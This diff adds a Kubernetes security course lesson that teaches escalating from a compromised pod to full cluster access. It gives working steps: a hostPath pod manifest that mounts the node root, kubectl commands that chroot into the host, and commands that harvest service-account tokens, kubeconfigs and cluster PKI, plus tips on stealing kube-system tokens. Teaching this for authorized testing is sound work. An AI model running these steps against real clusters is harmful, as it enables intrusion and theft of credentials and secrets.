@@ -1,0 +1,122 @@
+---
+title: Attacking a Cluster
+module: kubernetes-security
+moduleTitle: Kubernetes Security
+moduleOrder: 31
+moduleIcon: Ship
+order: 4
+summary: One compromised pod, then the node under it, then every secret in the cluster.
+estimatedMinutes: 25
+objectives:
+  - Chain a pod foothold into node-level code execution
+  - Abuse create-pod rights to mount the host filesystem
+  - Turn stolen node credentials into cluster-wide access
+tags:
+  - kubernetes
+  - privilege-escalation
+  - container-escape
+  - exploitation
+---
+
+You have shell in a pod. Maybe an SSRF got you there, maybe a vulnerable web app, maybe a supply-chain package. It does not matter how you arrived. What matters is the climb: pod to node to cluster. Each step trades a small foothold for a bigger one, and the cluster's own features do most of the lifting.
+
+## Step one: know your surroundings
+
+Before any payload, answer three questions. What token do you hold, from the last two lessons. Are you privileged. And can you see the host.
+
+<CommandBlock
+  title="assess the pod you landed in"
+  commands={[
+    { cmd: "id; capsh --print 2>/dev/null", comment: "root inside the container plus a fat capability set is a strong start" },
+    { cmd: "cat /proc/1/cgroup; ls -la /", comment: "confirm you are containerized and look for host mounts" },
+    { cmd: "env | grep -i kube", comment: "API server host and port, service ports, sometimes leaked creds" },
+    { cmd: "mount | grep -E 'docker|containerd|host'", comment: "a mounted docker.sock or host path is a direct escape" },
+  ]}
+/>
+
+If you see `/var/run/docker.sock` mounted, or the pod runs privileged, you can escape to the node right now. If not, RBAC is your ladder.
+
+## Step two: create a pod that mounts the host
+
+This is the workhorse escalation. If your token can create pods, you do not need a container escape bug. You ask Kubernetes politely to schedule a pod that mounts the node's root filesystem, then you read whatever you want from the host.
+
+<ExpectedOutput label="evil-pod.yaml, mounts the node root at /host">
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: maint-check
+spec:
+  containers:
+  - name: shell
+    image: alpine
+    command: ["sleep", "3600"]
+    volumeMounts:
+    - name: host
+      mountPath: /host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+```
+
+</ExpectedOutput>
+
+Apply it, exec in, and you are reading the node's disk as if you were sitting on the box.
+
+<CommandBlock
+  title="deploy the host-mount pod and read the node"
+  commands={[
+    { cmd: "kubectl apply -f evil-pod.yaml", comment: "schedule the pod; nodeName can pin it to a specific node if you want" },
+    { cmd: "kubectl exec -it maint-check -- chroot /host bash", comment: "chroot into the node's real filesystem" },
+    { cmd: "cat /host/etc/kubernetes/*.conf", comment: "kubelet and admin kubeconfigs live here on many setups" },
+  ]}
+/>
+
+The `type: Directory` and a `sleep` keep it stable. Pin it with `nodeName` if you are hunting a specific node's secrets.
+
+## Step three: harvest the node, reach the cluster
+
+Once you are on the node filesystem, the loot is concentrated in a few places. Every pod scheduled on this node has its service account token sitting under the kubelet's pod directory. The kubelet's own kubeconfig can talk to the API server. And if this is a control-plane node, etcd and the admin kubeconfig are right there.
+
+<CommandBlock
+  title="collect credentials from the node"
+  commands={[
+    { cmd: "find /host/var/lib/kubelet/pods -name token 2>/dev/null", comment: "service account tokens for every pod on this node" },
+    { cmd: "cat /host/var/lib/kubelet/kubeconfig", comment: "the kubelet's credential, often more privileged than your original token" },
+    { cmd: "ls /host/etc/kubernetes/pki 2>/dev/null", comment: "on a control-plane node, the cluster CA and client certs" },
+  ]}
+/>
+
+Collect tokens, replay them with `kubectl --token=`, and check each with `auth can-i --list`. One of them usually reaches further than the last. That is the pivot: a token from a sensitive pod that can read secrets cluster-wide, or an admin kubeconfig that ends the engagement.
+
+<Callout type="tip" title="Grab kube-system service accounts">
+The tokens worth stealing belong to pods in kube-system: controllers, CNI agents, cloud provider integrations. They are often bound to broad ClusterRoles because they legitimately need them. Find a node running one, host-mount it, lift the token, and you frequently inherit cluster-admin-adjacent rights without touching an actual admin credential.
+</Callout>
+
+<Callout type="security" title="Authorized targets only">
+Host-mount escapes and token harvesting are full compromise techniques. Run them only on clusters you own or have explicit written authorization to test, such as Kubernetes Goat or a scoped engagement. This activity is loud in audit logs and illegal without permission.
+</Callout>
+
+<Quiz
+  id="k8s-attack-createpod"
+  question="Your token cannot read secrets, but auth can-i shows you can create pods. Why does that still lead to the secrets?"
+  answer={2}
+  options={[
+    "Creating a pod automatically prints all cluster secrets",
+    "Pods bypass RBAC entirely",
+    "You can schedule a pod that mounts the host filesystem and read node-stored tokens and secrets directly",
+    "It does not, create-pod is harmless without read-secret",
+  ]}
+  explanation="create-pod lets you define a pod with a hostPath volume mounting the node root. From the node filesystem you read every pod's service account token and any secrets stored on disk, sidestepping the fact that your original token could not call get secrets over the API."
+/>
+
+<Exercise
+  id="k8s-attack-replay"
+  prompt="You harvested a token file from /host/var/lib/kubelet/pods and want to see how far it reaches before using it. Write the kubectl command that lists that stolen token's full permission set."
+  answer="kubectl --token=$(cat ./stolen-token) auth can-i --list"
+/>
+
+<Notes />
